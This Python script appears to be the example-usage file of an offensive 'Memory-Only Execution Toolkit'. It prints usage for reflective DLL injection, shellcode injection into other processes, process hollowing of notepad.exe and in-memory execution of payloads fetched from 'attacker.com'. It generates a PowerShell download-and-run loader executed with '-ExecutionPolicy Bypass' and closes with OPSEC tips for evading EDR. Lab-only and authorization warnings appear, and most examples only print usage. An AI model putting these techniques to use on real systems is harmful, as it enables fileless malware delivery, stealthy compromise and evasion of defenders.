#!/usr/bin/env python3
"""
Memory-Only Execution Toolkit - Example Usage

This script demonstrates how to use the framework programmatically.

WARNING: This is for demonstration on test/lab systems only!
"""

import sys
import os
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from memory_executor import MemoryExecutor
from memory_executor.utils import parse_pe_header, validate_url


def example_1_dll_injection():
    """Example: Reflective DLL injection"""
    print("\n" + "="*60)
    print("Example 1: Reflective DLL Injection")
    print("="*60)
    
    print("\n[*] Reflective DLL injection loads a DLL directly into memory")
    print("[*] without ever touching disk")
    
    print("\n[*] Example usage:")
    print("    executor = MemoryExecutor()")
    print('    executor.reflective_dll_injection("http://attacker.com/evil.dll")')
    
    print("\n[!] Not executing in demo (requires actual DLL URL)")


def example_2_shellcode_injection():
    """Example: Shellcode injection"""
    print("\n" + "="*60)
    print("Example 2: Shellcode Injection")
    print("="*60)
    
    print("\n[*] Shellcode injection executes raw shellcode in memory")
    
    # Example shellcode (NOP sled - harmless)
    example_shellcode = "9090909090909090"
    
    print(f"\n[*] Example shellcode (harmless NOPs): {example_shellcode}")
    
    print("\n[*] Inject into current process:")
    print("    executor = MemoryExecutor()")
    print(f'    executor.inject_shellcode("{example_shellcode}")')
    
    print("\n[*] Inject into remote process:")
    print("    executor = MemoryExecutor()")
    print(f'    executor.inject_shellcode("{example_shellcode}", target_pid=1234)')
    
    print("\n[!] Not executing in demo (requires valid shellcode)")


def example_3_process_hollowing():
    """Example: Process hollowing"""
    print("\n" + "="*60)
    print("Example 3: Process Hollowing")
    print("="*60)
    
    print("\n[*] Process hollowing:")
    print("    1. Create legitimate process in suspended state")
    print("    2. Unmap original executable code")
    print("    3. Inject malicious PE into process memory")
    print("    4. Resume process")
    
    print("\n[*] Example usage:")
    print("    executor = MemoryExecutor()")
    print('    with open("payload.exe", "rb") as f:')
    print("        payload_data = f.read()")
    print('    executor.process_hollowing(')
    print('        r"C:\\Windows\\System32\\notepad.exe",')
    print('        payload_data')
    print('    )')
    
    print("\n[!] Not executing in demo (requires payload file)")


def example_4_pe_execution():
    """Example: In-memory PE execution"""
    print("\n" + "="*60)
    print("Example 4: In-Memory PE Execution")
    print("="*60)
    
    print("\n[*] PE execution downloads and runs EXE entirely from memory")
    print("[*] No disk writes, no temporary files")
    
    print("\n[*] Example usage:")
    print("    executor = MemoryExecutor()")
    print('    executor.execute_pe_from_memory("http://attacker.com/payload.exe")')
    
    print("\n[!] Not executing in demo (requires actual PE URL)")


def example_5_powershell_generator():
    """Example: PowerShell script generation"""
    print("\n" + "="*60)
    print("Example 5: PowerShell Reflective Loader")
    print("="*60)
    
    print("\n[*] PowerShell reflective loader generates a .ps1 script")
    print("[*] that downloads and executes payload in memory")
    
    print("\n[*] Example usage:")
    print("    executor = MemoryExecutor()")
    print('    executor.generate_powershell_reflective_loader(')
    print('        "http://attacker.com/payload.bin",')
    print('        "loader.ps1"')
    print('    )')
    
    print("\n[*] Generated script can be executed:")
    print('    powershell.exe -ExecutionPolicy Bypass -File loader.ps1')
    
    # Actually generate an example
    print("\n[*] Generating example PowerShell script...")
    
    if os.name == 'nt':
        executor = MemoryExecutor()
        success = executor.generate_powershell_reflective_loader(
            "http://example.com/payload.bin",
            "example_loader.ps1"
        )
        
        if success:
            print(f"\n[+] Example script created: example_loader.ps1")
    else:
        print("[!] Skipping generation on non-Windows system")


def example_6_pe_parsing():
    """Example: PE header parsing"""
    print("\n" + "="*60)
    print("Example 6: PE Header Parsing")
    print("="*60)
    
    print("\n[*] The framework includes utilities for parsing PE headers")
    
    print("\n[*] Example:")
    print("    from memory_executor.utils import parse_pe_header")
    print()
    print('    with open("payload.exe", "rb") as f:')
    print("        pe_data = f.read()")
    print()
    print("    pe_info = parse_pe_header(pe_data)")
    print()
    print("    if pe_info and pe_info['is_valid']:")
    print("        print(f'Image Base: 0x{pe_info[\"image_base\"]:X}')")
    print("        print(f'Image Size: {pe_info[\"image_size\"]} bytes')")
    print("        print(f'Entry Point RVA: 0x{pe_info[\"entry_point_rva\"]:X}')")
    print("        print(f'Architecture: {'64-bit' if pe_info['is_64bit'] else '32-bit'}')")


def example_7_url_validation():
    """Example: URL validation"""
    print("\n" + "="*60)
    print("Example 7: URL Validation")
    print("="*60)
    
    print("\n[*] Helper function to validate URLs before downloading")
    
    test_urls = [
        ("http://example.com/payload.dll", True),
        ("https://example.com/payload.exe", True),
        ("ftp://example.com/file.bin", False),
        ("not a url", False)
    ]
    
    print("\n[*] Testing URL validation:")
    
    from memory_executor.utils import validate_url
    
    for url, should_be_valid in test_urls:
        result = validate_url(url)
        status = "✓" if result == should_be_valid else "✗"
        print(f"    {status} {url}: {'Valid' if result else 'Invalid'}")


def example_8_safety_considerations():
    """Example: Safety and OPSEC considerations"""
    print("\n" + "="*60)
    print("Example 8: Safety & OPSEC Considerations")
    print("="*60)
    
    print("\n[*] Important considerations when using memory execution:")
    
    print("\n1. Detection Risks:")
    print("   - Memory scans can detect injected code")
    print("   - Behavioral analysis may flag suspicious API calls")
    print("   - Network traffic can reveal payload downloads")
    
    print("\n2. OPSEC Best Practices:")
    print("   - Use HTTPS to encrypt payload downloads")
    print("   - Consider process injection into trusted processes")
    print("   - Avoid suspicious API call patterns")
    print("   - Clean up allocated memory when done")
    
    print("\n3. Legal Considerations:")
    print("   - Only use on systems you own or have written authorization")
    print("   - Memory execution may trigger EDR/AV alerts")
    print("   - Document all authorized testing activities")
    
    print("\n4. Testing:")
    print("   - Always test in isolated lab environment first")
    print("   - Verify payload functionality before deployment")
    print("   - Have cleanup procedures ready")


def main():
    """Run all examples"""
    print("\n" + "="*60)
    print("Memory-Only Execution Toolkit - Examples")
    print("="*60)
    print("\n[!] These examples demonstrate framework capabilities")
    print("[!] Most examples do not execute actual payloads for safety")
    
    try:
        example_1_dll_injection()
        example_2_shellcode_injection()
        example_3_process_hollowing()
        example_4_pe_execution()
        example_5_powershell_generator()
        example_6_pe_parsing()
        example_7_url_validation()
        example_8_safety_considerations()
        
        print("\n" + "="*60)
        print("All Examples Completed")
        print("="*60)
        print("\n[*] Next steps:")
        print("    1. Review main.py CLI for command-line usage")
        print("    2. Read README.md for complete documentation")
        print("    3. Test in isolated lab environment")
        print("    4. Always obtain authorization before testing")
        
    except Exception as e:
        print(f"\n[-] Error running examples: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()